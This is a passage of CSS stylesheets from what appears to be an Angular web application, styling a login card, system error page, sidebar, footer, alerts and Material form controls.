        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .button-wrapper[_ngcontent-ois-c57] {
            justify-content: center
        }

        .content__description[_ngcontent-ois-c57] {
            display: flex;
            flex-direction: column;
            padding: 24px;
            margin: auto
        }

        .close[_ngcontent-ois-c57] {
            position: absolute;
            cursor: pointer;
            top: 8px;
            right: 20px;
            font-size: 30px;
            z-index: 1;
            opacity: 1
        }

        @media (max-width: 393px) {
            .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] {
                position: absolute;
                height: 100vh;
                width: 100vw;
                max-width: 100vw;
                border-radius: 0
            }
        }
    </style>
    <style>
        @charset "UTF-8";

        .pointer[_ngcontent-ois-c77] {
            cursor: pointer
        }

        .navigation[_ngcontent-ois-c77] {
            background-color: #fcfbf6 !important
        }

        #system-error[_ngcontent-ois-c77] {
            visibility: hidden;
            position: absolute;
            background-color: #fcfbf6;
            width: 100%;
            min-height: calc(100vh - 104px);
            padding: 0 0 24px;
            top: 0;
            left: 0;
            line-height: 1;
            z-index: 1002;
            display: flex;
            justify-content: center;
            align-items: center
        }

        #system-error.active[_ngcontent-ois-c77] {
            visibility: visible;
            position: relative;
            animation: fadeIn ease-in .3s
        }

        #system-error.hide[_ngcontent-ois-c77] {
            visibility: hidden;
            animation: fadeOut ease-out .3s
        }

        #system-error[_ngcontent-ois-c77] .row[_ngcontent-ois-c77] {
            margin-left: 0;
            padding: 0 24px
        }

        #system-error[_ngcontent-ois-c77] .error-page-title-wrapper[_ngcontent-ois-c77] {
            margin-bottom: 72px
        }

        #system-error[_ngcontent-ois-c77] .error-page-title-wrapper[_ngcontent-ois-c77] .error-page-title[_ngcontent-ois-c77] {
            width: 100%;
            color: #009fda;
            font-family: Arial, sans-serif;
            font-size: 22px;
            font-weight: 700
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] {
            justify-content: center;
            align-items: center;
            width: 100%;
            margin-left: 0
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .block-error[_ngcontent-ois-c77] {
            width: 600px
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-image-wrapper[_ngcontent-ois-c77] {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            width: 100%;
            max-width: 276px;
            margin-left: 24px
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-image-wrapper[_ngcontent-ois-c77] img[_ngcontent-ois-c77] {
            height: auto;
            width: 100%
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-title[_ngcontent-ois-c77] {
            display: block;
            font: 700 24px/28px Arial, sans-serif;
            font-weight: 700;
            color: #004e9b;
            margin-bottom: 24px
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-description[_ngcontent-ois-c77] {
            display: block;
            font: 20px/23px Arial, sans-serif;
            color: #666
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-description[_ngcontent-ois-c77] b[_ngcontent-ois-c77] {
            display: block;
            font-size: 26px;
            margin-bottom: 16px
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-description[_ngcontent-ois-c77] .li[_ngcontent-ois-c77] {
            margin: 1em 0
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-description[_ngcontent-ois-c77] .b-list[_ngcontent-ois-c77] {
            font-weight: 700
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-description[_ngcontent-ois-c77] .p-list[_ngcontent-ois-c77] {
            max-width: 95%;
            padding: .5em;
            position: relative;
            display: inline-table
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-footer[_ngcontent-ois-c77] {
            font-size: 18px;
            color: #666
        }

        #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-footer[_ngcontent-ois-c77] .error-code[_ngcontent-ois-c77] {
            font-weight: bolder;
            color: #f33
        }

        #system-error[_ngcontent-ois-c77] .button-wrapper[_ngcontent-ois-c77] {
            display: flex;
            margin-top: 32px;
            justify-content: left
        }

        #system-error[_ngcontent-ois-c77] .button-wrapper[_ngcontent-ois-c77] .largeButton[_ngcontent-ois-c77] {
            width: 184px !important
        }

        #system-error[_ngcontent-ois-c77] .button-wrapper[_ngcontent-ois-c77] a[_ngcontent-ois-c77] button[_ngcontent-ois-c77] {
            width: 184px;
            padding-right: 16px;
            padding-left: 16px
        }

        @media (max-width: 834px) {
            #system-error[_ngcontent-ois-c77] .error-page-title-wrapper[_ngcontent-ois-c77] {
                margin-bottom: 24px
            }

            #system-error[_ngcontent-ois-c77] .error-page-title-wrapper[_ngcontent-ois-c77] .error-page-title[_ngcontent-ois-c77] {
                font-size: 20px
            }

            #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .block-error[_ngcontent-ois-c77] {
                width: 619px;
                order: 2
            }

            #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-image-wrapper[_ngcontent-ois-c77] {
                margin-left: 0;
                margin-bottom: 24px
            }

            #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-title[_ngcontent-ois-c77] {
                font-size: 24px;
                margin-bottom: 24px
            }

            #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-description[_ngcontent-ois-c77] {
                margin-bottom: 16px
            }

            #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-description[_ngcontent-ois-c77] b[_ngcontent-ois-c77] {
                font-size: 22px;
                margin-bottom: 16px
            }

            #system-error[_ngcontent-ois-c77] .system-error-wrapper[_ngcontent-ois-c77] .error-footer[_ngcontent-ois-c77] {
                font-size: 18px
            }

            .button-wrapper[_ngcontent-ois-c77] {
                order: 1;
                justify-content: center !important;
                margin-left: 0
            }

            .p-margin[_ngcontent-ois-c77] {
                margin-bottom: 0
            }
        }

        @media (max-width: 414px) {
            #system-error[_ngcontent-ois-c77] .button-wrapper[_ngcontent-ois-c77] {
                flex-direction: column-reverse;
                align-items: center
            }

            #system-error[_ngcontent-ois-c77] .button-wrapper[_ngcontent-ois-c77] a[_ngcontent-ois-c77] {
                margin-left: 0;
                margin-bottom: 24px;
                width: 100% !important
            }

            #system-error[_ngcontent-ois-c77] .button-wrapper[_ngcontent-ois-c77] a[_ngcontent-ois-c77] button[_ngcontent-ois-c77] {
                width: 100% !important
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c83] {
            cursor: pointer
        }

        .fade-background[_ngcontent-ois-c83] {
            position: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            background: #66666640 0% 0% no-repeat padding-box;
            z-index: 1001;
            transition: all .6s ease;
            top: 0;
            left: 0
        }

        .second-sidebar[_ngcontent-ois-c83] {
            position: fixed;
            background-color: #fff;
            min-height: 352px;
            height: 660px;
            font-family: Arial, sans-serif;
            top: 0;
            right: 0;
            padding-top: 64px;
            box-shadow: -2px 0 5px #00000029;
            overflow: hidden;
            transition: all .6s ease;
            z-index: 1001;
            width: 0px
        }

        .second-sidebar.active[_ngcontent-ois-c83] {
            width: 384px
        }

        .second-sidebar.active[_ngcontent-ois-c83] .content-menu[_ngcontent-ois-c83]:after {
            display: inline-block
        }

        .shadow[_ngcontent-ois-c83] {
            box-shadow: 0 3px 6px #00000029 !important;
            margin: 0 16px !important
        }

        .scroll-bar[_ngcontent-ois-c83] {
            height: 100% !important;
            overflow-y: scroll
        }

        .scroll-bar[_ngcontent-ois-c83]::-webkit-scrollbar {
            width: 4px
        }

        .scroll-bar[_ngcontent-ois-c83]::-webkit-scrollbar-thumb {
            background: #B9B8BE;
            border-radius: 5px
        }

        @media (max-width: 375px) {
            .second-sidebar.active[_ngcontent-ois-c83] {
                width: 100%
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c84] {
            cursor: pointer
        }

        footer[_ngcontent-ois-c84] {
            position: absolute;
            bottom: 0;
            left: 64px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 12px;
            height: 40px;
            background-color: #eee;
            padding: 0 20px;
            z-index: 1000;
            width: calc(100% - 64px)
        }

        footer.over[_ngcontent-ois-c84] {
            position: relative;
            width: 100%;
            z-index: 1003;
            left: 0
        }

        @media (max-width: 1111px) {
            footer[_ngcontent-ois-c84] {
                width: 100%;
                left: 0
            }
        }

        @media (max-width: 414px) {
            footer[_ngcontent-ois-c84] {
                font-size: 11px
            }
        }

        @media (max-width: 375px) {
            footer[_ngcontent-ois-c84] {
                padding: 0 12px;
                font-size: 9px
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c76] {
            cursor: pointer
        }

        .center-alert[_ngcontent-ois-c76] {
            text-align: -webkit-center
        }

        .center-alert[_ngcontent-ois-c76] .alert[_ngcontent-ois-c76] {
            padding: 12px;
            background-color: #e5edf5;
            color: #666;
            font-size: 12px;
            margin-bottom: 0;
            border-radius: 12px;
            text-align: center;
            width: 55%;
            display: flex;
            justify-content: center;
            box-shadow: 0 3px 6px #00000029
        }

        .alert__message[_ngcontent-ois-c76] {
            margin-left: 8px;
            vertical-align: middle
        }

        @media (max-width: 414px) {
            .center-alert[_ngcontent-ois-c76] .alert[_ngcontent-ois-c76] {
                width: 90%;
                text-align: left;
                display: flex
            }

            .center-alert[_ngcontent-ois-c76] img[_ngcontent-ois-c76] {
                margin-right: 8px
            }

            .alert__message[_ngcontent-ois-c76] {
                margin-left: 0
            }
        }

        @media (max-width: 320px) {
            .center-alert[_ngcontent-ois-c76] .alert[_ngcontent-ois-c76] {
                width: 270px;
                text-align: left;
                display: flex
            }

            .center-alert[_ngcontent-ois-c76] img[_ngcontent-ois-c76] {
                margin-right: 8px
            }
        }

        #navigation[_ngcontent-ois-c76] {
            margin: 0;
            padding: 0
        }

        #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] {
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 24px 24px 8px
        }

        #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-section[_ngcontent-ois-c76] {
            display: flex;
            flex-direction: row-reverse;
            justify-content: space-between;
            height: 16px;
            font-size: 12px;
            font-family: Arial, sans-serif;
            color: #666;
            margin: 0
        }

        #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-section[_ngcontent-ois-c76] .data-info-section-date[_ngcontent-ois-c76] {
            justify-content: flex-end
        }

        #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-section[_ngcontent-ois-c76] .data-info-section-breadcrumb[_ngcontent-ois-c76] {
            justify-content: flex-start
        }

        #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-section[_ngcontent-ois-c76] .data-info-section-breadcrumb[_ngcontent-ois-c76] .separator[_ngcontent-ois-c76] {
            margin: 0 4px
        }

        #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-page[_ngcontent-ois-c76] {
            margin-top: 8px;
            color: #009fda
        }

        #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-page[_ngcontent-ois-c76] .data-info-page-title[_ngcontent-ois-c76] {
            font-size: 24px;
            font-weight: 700
        }

        @media (max-width: 768px) {
            #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] {
                padding: 24px 16px 8px
            }
        }

        @media (max-width: 568px) {
            #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-section[_ngcontent-ois-c76] {
                display: flex;
                flex-direction: column
            }

            #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-section[_ngcontent-ois-c76] .data-info-section-date[_ngcontent-ois-c76] {
                display: flex;
                justify-content: flex-end
            }

            #navigation[_ngcontent-ois-c76] .data-info[_ngcontent-ois-c76] .data-info-page[_ngcontent-ois-c76] {
                margin-top: 16px
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c75] {
            cursor: pointer
        }

        .center-alert[_ngcontent-ois-c75] {
            text-align: -webkit-center;
            display: inline-block
        }

        .center-alert[_ngcontent-ois-c75] .alert[_ngcontent-ois-c75] {
            padding: 8px;
            color: #666;
            font-size: 12px;
            font-weight: 700;
            margin-bottom: 12px;
            border-radius: 12px;
            text-align: center;
            display: flex;
            justify-content: center;
            box-shadow: 0 3px 6px #00000029;
            align-items: center
        }

        .successful[_ngcontent-ois-c75] {
            background-color: #eaf4d8
        }

        .error[_ngcontent-ois-c75] {
            background-color: #ffe6e6
        }

        .notification[_ngcontent-ois-c75] {
            background-color: #e5edf5
        }

        .alert__message[_ngcontent-ois-c75] {
            margin-left: 8px;
            vertical-align: middle
        }

        .icon[_ngcontent-ois-c75] {
            height: 24px
        }

        .alert-wrapper[_ngcontent-ois-c75] {
            display: flex;
            justify-content: center;
            position: absolute;
            top: 40px;
            width: 100%
        }

        .background-summary[_ngcontent-ois-c75] {
            background-color: #fcfbf6;
            padding: 24px
        }

        @media (max-width: 414px) {
            .center-alert[_ngcontent-ois-c75] .alert[_ngcontent-ois-c75] {
                width: 90%;
                text-align: left;
                display: flex
            }

            .center-alert[_ngcontent-ois-c75] img[_ngcontent-ois-c75] {
                margin-right: 8px
            }

            .alert__message[_ngcontent-ois-c75] {
                margin-left: 0
            }
        }

        @media (max-width: 320px) {
            .center-alert[_ngcontent-ois-c75] .alert[_ngcontent-ois-c75] {
                width: 270px;
                text-align: left;
                display: flex
            }

            .center-alert[_ngcontent-ois-c75] img[_ngcontent-ois-c75] {
                margin-right: 8px
            }
        }
    </style>
    <style>
        mat-form-field {
            font-family: Arial, sans-serif !important;
            margin-bottom: 4px;
            width: 100%
        }

        mat-form-field.mat-form-field-should-float .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper .mat-form-field-label {
            color: #004e9b
        }

        mat-form-field.mat-form-field-should-float .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper .mat-form-field-label mat-label {
            font-family: Arial, sans-serif;
            color: #004e9b;
            font-weight: 700
        }

        mat-form-field .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix input {
            color: #666;
            caret-color: #666 !important
        }

        mat-form-field .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper label {
            transform: translateY(-1.34375em) scale(.85)
        }

        mat-form-field .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper label mat-label {
            font-size: 16px;
            font-weight: 400;
            color: #a1a1a1;
            font-family: Arial, sans-serif
        }

        mat-form-field .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper label .mat-form-field-required-marker {
            display: none
        }

        mat-form-field .mat-form-field-wrapper .mat-form-field-underline {
            background-color: #004e9b;
            background-image: none
        }

        mat-form-field .mat-form-field-wrapper .mat-form-field-subscript-wrapper .mat-form-field-hint-wrapper mat-hint {
            margin-top: 8px;
            font-family: Arial, sans-serif;
            color: #666;
            font-size: 12px
        }

        mat-form-field.mat-hint-margin {
            margin-bottom: 24px
        }

        mat-form-field.mat-form-field-invalid .mat-form-field-wrapper {
            margin-bottom: 20px
        }

        mat-form-field.mat-form-field-invalid .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper .mat-form-field-label mat-label {
            color: #f33 !important
        }

        mat-form-field.mat-form-field-invalid .mat-form-field-wrapper .mat-form-field-subscript-wrapper {
            margin-top: 0
        }

        mat-form-field.mat-form-field-invalid .mat-form-field-wrapper .mat-form-field-subscript-wrapper mat-error {
            color: #666;
            background: #FFE6E6 0 0 no-repeat padding-box;
            border-radius: 0 0 10px 10px;
            padding: 5px
        }

        mat-form-field.mat-form-field-invalid .mat-form-field-wrapper .mat-form-field-underline {
            z-index: 1
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-underline {
            background-color: #96b5d1;
            background-image: none
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-subscript-wrapper .mat-form-field-hint-wrapper mat-hint {
            color: #96b5d1
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-input-element:disabled {
            color: #96b5d1 !important
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-input-element::-moz-placeholder {
            color: #96b5d1
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-input-element::placeholder {
            color: #96b5d1
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper .mat-form-field-label mat-label {
            color: #96b5d1 !important
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-suffix mat-icon {
            opacity: .5
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-suffix mat-icon img {
            cursor: default !important
        }

        mat-form-field {
            font-family: Arial, sans-serif !important
        }

        mat-form-field.mat-form-field-should-float .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-select .mat-select-trigger .mat-select-value {
            color: #666;
            font-family: Arial, sans-serif
        }

        mat-form-field.mat-form-field-should-float .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-select .mat-select-trigger .mat-select-arrow-wrapper .mat-select-arrow {
            border: 0 !important;
            width: auto !important;
            height: auto !important
        }

        mat-form-field.mat-form-field-should-float .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-select .mat-select-trigger .mat-select-arrow-wrapper .mat-select-arrow:before {
            border-style: solid;
            border-width: 0 0 2px 2px;
            border-color: #004e9b;
            content: "";
            display: inline-block;
            height: 8px;
            width: 8px;
            top: 3px;
            left: 0;
            position: relative;
            transform: rotate(-45deg);
            vertical-align: top;
            transition: all .3s ease
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-underline {
            background-color: #96b5d1;
            background-image: none
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-select-disabled .mat-select-trigger .mat-select-value {
            color: #96b5d1 !important
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-select-disabled .mat-select-trigger .mat-select-value .mat-select-placeholder {
            color: #96b5d1 !important
        }

        mat-form-field.mat-form-field-disabled .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-select-disabled .mat-select-trigger .mat-select-arrow-wrapper .mat-select-arrow:before {
            border-color: #96b5d1
        }

        mat-form-field.mat-form-field-should-float .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-select-invalid .mat-select-trigger .mat-select-arrow-wrapper .mat-select-arrow:before {
            border-color: #f33
        }

        .mat-select-panel-wrap .mat-select-panel {
            background-color: #fff !important;
            overflow-x: hidden
        }

        .mat-select-panel-wrap .mat-select-panel::-webkit-scrollbar {
            width: 4px
        }

        .mat-select-panel-wrap .mat-select-panel::-webkit-scrollbar-thumb {
            background-color: #a1a1a1;
            outline: 1px solid slategrey;
            border-radius: 4px;
            max-height: 24px;
            z-index: 2
        }

        .mat-select-panel-wrap .mat-select-panel mat-option {
            text-wrap: wrap;
            height: auto;
            color: #4d4545de
        }

        .mat-select-panel-wrap .mat-select-panel mat-option.mat-selected {
            color: #4d4545de !important
        }

        .mat-select-panel-wrap .mat-select-panel mat-option .mat-option-text {
            padding: 16px 0;
            line-height: 1;
            font-family: Arial, sans-serif
        }

        .mat-select-panel-wrap .mat-select-panel mat-option .mat-option-text .title {
            font-size: 16px;
            color: #666;
            margin-bottom: 8px
        }

        .mat-select-panel-wrap .mat-select-panel mat-option .mat-option-text .subtitle {
            margin-top: 8px;
            font-size: 14px;
            color: #a1a1a1
        }

        .mat-select-panel-wrap .mat-select-panel mat-option .mat-option-text .subtitle-alias {
            font-size: 14px;
            color: #a1a1a1;
            margin-top: 8px
        }

        .mat-checkbox .mat-checkbox-layout .mat-checkbox-inner-container {
            height: 24px !important;
            width: 24px !important
        }

        .mat-checkbox .mat-checkbox-layout .mat-checkbox-inner-container .mat-checkbox-frame {
            border-color: #004e9b;
            background-color: transparent !important;
            border-width: 2px;
            border-style: solid
        }

        .mat-checkbox .mat-checkbox-layout .mat-checkbox-label {
            align-self: center
        }

        .mat-checkbox-disabled.mat-checkbox-checked .mat-checkbox-layout .mat-checkbox-inner-container .mat-checkbox-background {
            background-color: #96b5d1
        }

        .mat-checkbox-disabled .mat-checkbox-layout .mat-checkbox-inner-container .mat-checkbox-frame {
            border-color: #96b5d1
        }

        mat-form-field.mat-datepicker-enable .mat-form-field-wrapper .mat-form-field-underline {
            background-color: #004e9b;
            background-image: none
        }

        mat-form-field.mat-datepicker-enable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper .mat-form-field-label mat-label {
            color: #004e9b
        }

        mat-form-field.mat-datepicker-enable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-datepicker-input:disabled {
            color: #666 !important
        }

        mat-form-field.mat-datepicker-enable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-datepicker-input::-moz-placeholder {
            color: #666 !important
        }

        mat-form-field.mat-datepicker-enable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-datepicker-input::placeholder {
            color: #666 !important
        }

        mat-form-field.mat-datepicker-enable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-suffix mat-icon {
            opacity: 1
        }

        mat-form-field.mat-datepicker-enable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-suffix mat-icon img {
            cursor: pointer !important
        }

        mat-form-field.mat-datepicker-disable .mat-form-field-wrapper .mat-form-field-underline {
            background-color: #96b5d1;
            background-image: none
        }

        mat-form-field.mat-datepicker-disable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-form-field-label-wrapper .mat-form-field-label mat-label {
            color: #96b5d1
        }

        mat-form-field.mat-datepicker-disable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-input-element:disabled {
            color: #96b5d1 !important
        }

        mat-form-field.mat-datepicker-disable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-input-element::-moz-placeholder {
            color: #96b5d1
        }

        mat-form-field.mat-datepicker-disable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-infix .mat-input-element::placeholder {
            color: #96b5d1
        }

        mat-form-field.mat-datepicker-disable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-suffix mat-icon {
            opacity: .5
        }

        mat-form-field.mat-datepicker-disable .mat-form-field-wrapper .mat-form-field-flex .mat-form-field-suffix mat-icon img {
            cursor: default !important
        }

        .mat-radio-button .mat-radio-label {
            cursor: pointer !important
        }

        .mat-radio-button .mat-radio-label .mat-radio-container .mat-radio-inner-circle {
            height: 30px;
            width: 30px;
            top: -3px;
            left: -3px;
            background-color: #004e9b
        }

        .mat-radio-button .mat-radio-label .mat-radio-container .mat-radio-outer-circle {
            background-color: #fff;
            border-color: #004e9b;
            width: 24px;
            height: 24px
        }

        .mat-radio-disabled .mat-radio-label {
            cursor: default !important
        }

        .mat-radio-disabled .mat-radio-label .mat-radio-container .mat-radio-outer-circle {
            background-color: transparent;
            border-color: #96b5d1
        }

        .mat-radio-disabled .mat-radio-label .mat-radio-container .mat-radio-inner-circle {
            background-color: #96b5d1
        }

        .pointer[_ngcontent-ois-c165] {
            cursor: pointer
        }

        #login-melp[_ngcontent-ois-c165] .mat-accent .mat-slide-toggle-label .mat-slide-toggle-bar {
            background-color: #96b5d1
        }

        #login-melp[_ngcontent-ois-c165] .mat-accent .mat-slide-toggle-label .mat-slide-toggle-bar .mat-slide-toggle-thumb {
            border: 1px solid #96B5D1
        }

        #login-melp[_ngcontent-ois-c165] .mat-slide-toggle.mat-checked:not(.mat-disabled) .mat-slide-toggle-bar {
            background-color: #004e9b
        }

        #login-melp[_ngcontent-ois-c165] .mat-slide-toggle.mat-checked:not(.mat-disabled) .mat-slide-toggle-thumb {
            background-color: #004e9b
        }

        #login-melp[_ngcontent-ois-c165] .mat-accent.mat-checked .mat-slide-toggle-bar .mat-slide-toggle-thumb {
            background-color: #fff;
            border: 1px solid #004e9b
        }

        .card-wrapper[_ngcontent-ois-c165] {
            display: flex;
            justify-content: center;
            width: 100%
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] {
            width: 320px;
            border: none;
            box-shadow: none;
            background: transparent
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .login-link[_ngcontent-ois-c165] {
            color: #004e9b;
            text-align: right;
            margin-bottom: 16px;
            margin-top: -6px;
            font-family: Arial;
            font-size: 14px;
            font-style: normal;
            font-weight: 400;
            line-height: normal;
            cursor: pointer
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] {
            padding: 0
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .login-title[_ngcontent-ois-c165] {
            text-align: center;
            font-family: Arial;
            font-weight: 700;
            font-style: normal;
            line-height: normal
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .login-title[_ngcontent-ois-c165] .login-welcome[_ngcontent-ois-c165] {
            color: #009fda;
            font-size: 24px;
            margin-bottom: 8px
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .login-title[_ngcontent-ois-c165] .login-iniciated[_ngcontent-ois-c165] {
            color: #004e9b;
            font-size: 32px;
            margin-bottom: 32px
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .form-group[_ngcontent-ois-c165] .mat-form-field[_ngcontent-ois-c165] {
            width: 100%
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .recover-user[_ngcontent-ois-c165] {
            display: flex;
            align-items: center;
            margin: 32px 0 0;
            font-size: 14px;
            font-family: Arial;
            font-style: normal;
            line-height: normal
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .recover-user[_ngcontent-ois-c165] .recover-user-label[_ngcontent-ois-c165] {
            margin-bottom: 1px;
            margin-right: 44px;
            color: #004e9b;
            font-weight: 700
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .login-button[_ngcontent-ois-c165] {
            margin: 32px 0 0
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .login-button.recover-user-button[_ngcontent-ois-c165] {
            margin-bottom: 32px
        }

        .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .login-link-not-user[_ngcontent-ois-c165] {
            color: #004e9b;
            text-align: center;
            margin-top: -6px;
            font-family: Arial;
            font-size: 14px;
            font-style: normal;
            font-weight: 400;
            line-height: normal;
            cursor: pointer
        }

        @media (max-width: 768px) {
            .card-wrapper[_ngcontent-ois-c165] .card[_ngcontent-ois-c165] .card-body[_ngcontent-ois-c165] .login-button[_ngcontent-ois-c165] {
                margin: 32px 0
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c74] {
            cursor: pointer
        }

        .fade-background[_ngcontent-ois-c74] {
            position: fixed;
            display: flex;
            visibility: hidden;
            justify-content: center;
            align-items: center;
            opacity: 0;
            width: 100%;
            min-height: 100%;
            background-color: #0000008f;
            z-index: 1004;
            transition: all .6s ease
        }

        .fade-background.active[_ngcontent-ois-c74] {
            visibility: visible;
            opacity: 1
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] {
            max-width: 400px;
            border-radius: 25px;
            line-height: 1
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .close[_ngcontent-ois-c74] {
            position: absolute;
            cursor: pointer;
            top: 8px;
            right: 12px;
            font-size: 20px;
            z-index: 1
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .card-body[_ngcontent-ois-c74] .title[_ngcontent-ois-c74] {
            font-size: 20px;
            font-family: Arial, sans-serif;
            color: #004e9b;
            font-weight: 700;
            text-align: center;
            padding-bottom: 24px
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .card-body[_ngcontent-ois-c74] .mail-field[_ngcontent-ois-c74] {
            font-size: 14px !important;
            width: 100% !important
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .card-body[_ngcontent-ois-c74] .mail-label[_ngcontent-ois-c74] {
            font-size: 18px !important;
            padding-bottom: 6px !important
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .card-body[_ngcontent-ois-c74] .button-wrapper[_ngcontent-ois-c74] {
            justify-content: center !important;
            padding-top: 30px
        }

